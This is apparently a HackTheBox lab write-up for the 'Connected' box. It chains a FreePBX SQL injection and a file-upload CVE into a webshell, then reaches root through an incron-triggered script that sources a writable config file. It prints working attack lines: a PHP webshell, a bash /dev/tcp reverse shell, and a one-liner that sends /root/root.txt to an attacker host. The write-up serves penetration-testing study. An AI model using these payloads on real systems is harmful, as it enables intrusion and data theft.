---
title: "Connected"
date: 2026-06-18
categories: [HackTheBox, Easy]
tags: [linux, FreePBX, SQLi, file upload, incron, CVE]
image:
  path: /assets/img/HTB/Connected/banner.png
  alt: Connected writeup
protected: true
---


FreePBX 16.0.40.7 chained exploitation: unauthenticated stacked SQL injection (**CVE-2025-57819**) plants a freshly-minted admin row in `ampusers`, then authenticated arbitrary file upload (**CVE-2025-61678**) drops a PHP webshell into the web root via `fwbrand` path traversal. Privilege escalation pivots on an `incron` watch that runs a root-owned script which sources a writable `/etc/dahdi/init.conf` — injecting a command into that file and triggering the watched event yields code execution as `root`.

| Field      | Details             |
|------------|---------------------|
| Platform   | HackTheBox          |
| Difficulty | Easy                |
| OS         | Linux               |
| IP         | 10.129.27.223       |
| Date       | June 2026           |

## Tools Used

| Tool                | Description                                                                          |
|---------------------|--------------------------------------------------------------------------------------|
| ping                | ICMP utility to verify host reachability                                             |
| nmap                | Network port scanner and service fingerprinter                                       |
| Web browser         | Manual reconnaissance of the FreePBX administration panel and version disclosure     |
| Python 3 (requests) | Used to run the public CVE-2025-57819 + CVE-2025-61678 exploit chain                 |
| netcat (nc)         | TCP listener for the reverse shell and later for blind flag exfiltration             |
| find                | Filesystem enumeration to locate writable files owned by privileged groups           |
| incron              | Filesystem-event-driven cron variant; the misconfiguration vector for privilege escalation |
| Bash                | Reverse-shell payloads and command injection into the sourced config file            |

## Reconnaissance & Enumeration

The objective of this phase was to map the attack surface and identify which exposed service held the entry point.

### Host Discovery

Reachability was confirmed with ICMP. The TTL of 63 (default Linux TTL is 64, decremented once across the routing hop) gave the usual OS hint:

```bash
ping -c 1 10.129.27.223
PING 10.129.27.223 (10.129.27.223) 56(84) bytes of data.
64 bytes from 10.129.27.223: icmp_seq=1 ttl=63 time=43.4 ms
```

### Port Scan

A SYN scan across all 65535 TCP ports at a high packet rate. `-Pn` skipped host discovery (ICMP already proved liveness) and `-n` disabled reverse DNS to keep the scan fast:

```bash
sudo nmap -p- --min-rate 5000 -sS -vvv -Pn -n 10.129.27.223 -oG allPorts
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
Not shown: 65532 filtered tcp ports (no-response)
```

The 65532 filtered ports (rather than closed) signaled a host-based or perimeter firewall silently dropping packets to everything except 22/80/443 — useful context, because it ruled out finding any hidden management ports.

A targeted scan with default scripts and version detection followed:

```bash
sudo nmap -p22,80,443 -sCV 10.129.27.223 -oN nmap
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to http://connected.htb/
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/...
```

Three details mattered. OpenSSH 7.4 is old enough to be suspicious, but it's not directly exploitable without credentials so SSH was deprioritized. The HTTP server is **Apache 2.4.6 on CentOS with PHP 7.4.16** — a legacy CentOS 7 stack. And critically, two facts pointed straight at a specific product: the redirect to `http://connected.htb/` (name-based virtual hosting) and the TLS certificate's `commonName=pbxconnect`. The `pbx` substring strongly suggested a private branch exchange (PBX) — almost certainly **FreePBX**, the most common open-source PBX product.

The domain was added to `/etc/hosts` so the application would resolve correctly:

```bash
echo "10.129.27.223 connected.htb" | sudo tee -a /etc/hosts
```

### Web Application

Browsing to `http://connected.htb/` loaded the FreePBX administration interface. The footer disclosed the exact version:

![FreePBX 16.0.40.7 admin panel](/assets/img/HTB/Connected/web.png)

```text
FreePBX 16.0.40.7
```

A version that precise points straight at a known CVE search. FreePBX 16.0.40.7 is affected by **CVE-2025-57819**, an unauthenticated stacked SQL injection in the Endpoint Manager module that can be chained with **CVE-2025-61678**, an authenticated arbitrary file upload in the same module's firmware uploader. The chain is publicly weaponized, including a Python PoC by `0xEHxb` on GitHub that automates both stages and lands a webshell in one shot.

## Exploitation

### Chain Overview: CVE-2025-57819 + CVE-2025-61678

The two vulnerabilities are independently meaningful but become decisive when chained:

**CVE-2025-57819** lives in the endpoint module's AJAX loader at `/admin/ajax.php`. The `brand` parameter is concatenated into a SQL query without parameterization, and because the underlying connector supports **stacked queries** (multiple statements separated by `;` in a single request), an attacker can append arbitrary SQL — including `INSERT` statements against the `asterisk.ampusers` table that stores admin credentials. The bug is reachable **without authentication**, which means a fresh admin account can be planted with a single GET request.

**CVE-2025-61678** is an authenticated path-traversal-based file upload in the Endpoint Manager's firmware uploader (`upload_cust_fw` command). The `fwbrand` parameter is meant to namespace uploads under `/tftpboot/customfw/<brand>/`, but it accepts `../` sequences, so a value like `../../../var/www/html/<dir>` writes the uploaded file directly into the Apache web root. Combined with the file being any extension the attacker chooses (no MIME validation), this is a direct PHP webshell drop.

The chain therefore reads: **inject admin via SQLi → log in as that admin → upload PHP shell into web root → execute commands**. The PoC by `0xEHxb` (`FreePBX-CVE-2025-57819-RCE`) implements exactly this flow.

### Running the Exploit

The PoC accepts target and reverse-shell parameters; with a netcat listener prepared on the attacker side, a single invocation handles both CVEs and triggers the callback:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
```

```bash
python3 exploit.py --rhost connected.htb --lhost <ATTACKER_IP> --lport 4444
[*] [CVE-2025-57819] creating admin via stacked SQLi: svc_xxxxx:xxxxxxxxxxxx
[+] admin row inserted into ampusers
[*] logging into FreePBX admin panel
[+] authenticated as svc_xxxxx
[*] [CVE-2025-61678] uploading webshell -> /<rnd>/<rnd>.php
[+] webshell live: https://connected.htb/<rnd>/<rnd>.php
[*] firing reverse shell -> <ATTACKER_IP>:4444
```

Internally, the SQLi step issues a `DELETE` (for idempotency) and an `INSERT` into `ampusers` with the username's SHA-1 hashed password and section value `0x2a` (`*`, meaning all FreePBX sections). The file-upload step posts to `/admin/ajax.php?module=endpoint&command=upload_cust_fw` with `fwbrand=../../../var/www/html/<dir>` and a PHP file body of `<?php system($_REQUEST["cmd"]); ?>` — once written, that path is directly reachable via Apache.

The listener received the callback as the **`asterisk`** service user — the unprivileged account FreePBX runs under:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.27.223 41540
bash: no job control in this shell
[asterisk@connected nroee4ivcb]$ whoami
asterisk
```

The shell landed inside the randomly-named directory created by the upload step (`nroee4ivcb`). A quick TTY upgrade (`script /dev/null -c bash`, `stty raw -echo; fg`, `reset`) made it usable, and the user flag was readable from `asterisk`'s home directory:

```bash
cat /home/asterisk/user.txt
```

## Privilege Escalation — `asterisk` → `root`

With a shell as `asterisk`, the goal was to find a path to root. The usual quick checks — `sudo -l`, SUID enumeration, capabilities — came back empty, so the next move was looking for files writable by the current user that might be read or executed by something more privileged. A targeted `find` filtering out the noise of FreePBX's own writable directories produced the lead:

```bash
find /etc -writable 2>/dev/null | grep -v "/etc/wanpipe\|/etc/asterisk\|/etc/schmooze" | head -20
/etc/dahdi/init.conf
```

A writable configuration file under `/etc/dahdi` (DAHDI is the kernel driver layer Asterisk uses to talk to telephony hardware) is exactly the kind of file a privileged service might read. The question was *which* privileged service, and *when*.

### Finding the Trigger — Incron

On most CTF-style boxes, the answer to "what reads this file as root" turns out to be either a cron job or a systemd service. On this box it was neither — it was **incron**, the inotify-based event-driven variant of cron that runs commands in response to filesystem events (file written, modified, deleted, etc.).

Reading the system-wide incron configuration revealed the rule:

```bash
cat /etc/incron.d/*
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

The rule reads: *whenever the file `/var/spool/asterisk/sysadmin/dahdi_restart` is closed after being written to (`IN_CLOSE_WRITE`), execute `/usr/sbin/sysadmin_dahdi_restart`*. The script runs as root (incron's `system tables` under `/etc/incron.d/` run as root by default), and the watched file lives under `/var/spool/asterisk/sysadmin/` — a directory the `asterisk` user can write to.

Inspecting the root-owned script revealed what made this chain exploitable: among its tasks, the script **sources** `/etc/dahdi/init.conf` to load configuration variables. Sourcing in Bash (`source <file>` or `. <file>`) does not just parse key=value pairs; it executes the file as a shell script in the calling shell's context. Any line in the sourced file that is not strictly a variable assignment runs as a shell command — with the privileges of whoever did the sourcing.

The chain therefore reads:

1. `asterisk` writes a command to `/etc/dahdi/init.conf` (writable).
2. `asterisk` writes anything to `/var/spool/asterisk/sysadmin/dahdi_restart` (writable, and triggers `IN_CLOSE_WRITE`).
3. incron fires `/usr/sbin/sysadmin_dahdi_restart` **as root**.
4. The script sources `/etc/dahdi/init.conf`, executing the injected command **as root**.

### Exploitation

The first attempt was the textbook approach — a reverse shell injected into the sourced config:

```bash
echo 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4445 0>&1" &' >> /etc/dahdi/init.conf
```

The trailing `&` backgrounds the spawned shell so the root script doesn't block on it, which would otherwise stall the whole restart routine and might raise alarms. A second listener was started:

```bash
nc -lvnp 4445
Listening on 0.0.0.0 4445
```

And the trigger fired:

```bash
echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart
```

The reverse shell didn't reliably connect back — likely a combination of egress filtering on the target and the way the sourced script handled signal/exit semantics around the backgrounded process. Rather than fight the reverse shell, I switched to **blind exfiltration**: the same injection point can execute *any* root command, and netcat will happily forward arbitrary file contents over a TCP connection. Replacing the reverse-shell payload with a direct `cat | /dev/tcp/` exfil was simpler and more reliable:

```bash
echo 'bash -c "cat /root/root.txt > /dev/tcp/<ATTACKER_IP>/4445" &' >> /etc/dahdi/init.conf
echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart
```

On the attacker side, the listener caught the flag content directly:

```bash
nc -nlvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.129.27.223 54888
<root.txt content>
```

This is worth highlighting as a technique on its own. When a command-injection privesc gives you root execution but reverse shells misbehave, you don't actually need an interactive shell to win — you only need the **flag** (or whichever specific file the engagement requires). A single-shot `cat > /dev/tcp/...` is harder to break and produces a clean, predictable network event.

## Flags

| Flag     | Value      |
|----------|------------|
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

## Key Takeaways

- **Public version banners on legacy stacks are a privesc on rails.** The combination of Apache 2.4.6, PHP 7.4.16, a CentOS-era OS, and a precise FreePBX 16.0.40.7 version disclosure took the engagement from "let's enumerate" to "let's pick the CVE chain" in under a minute. None of those numbers needed to be exposed publicly.
- **`X-Powered-By`-style version disclosure compounds with chained CVEs.** CVE-2025-57819 alone gives you a database write; CVE-2025-61678 alone needs an authenticated session. The chain is what's lethal, and the chain is only obvious once the version banner identifies both as in-scope.
- **Sourced config files are command-injection sinks by design.** Any shell script that does `source /path/to/some.conf` is, semantically, executing that file. If the file is writable by a less-privileged principal than the one running the script, the chain is already broken — there is no "but it only reads variables" defense, because Bash doesn't distinguish at parse time.
- **Incron is the easy-to-miss third option.** Privilege-escalation enumeration tooling (LinPEAS, linpriv, etc.) does check incron tables, but operators sometimes forget about it because it's less common than cron and systemd. `cat /etc/incron.d/*` and `cat /var/spool/incron/*` belong in every Linux privesc checklist.
- **You don't always need a shell — you need the artifact.** When reverse shells misbehave on a tight-egress target, single-shot exfiltration of the specific file you need (`cat /root/root.txt > /dev/tcp/...`) is faster, more reliable, and often quieter than trying to debug TTY/pipe interactions over an unreliable command-injection channel.
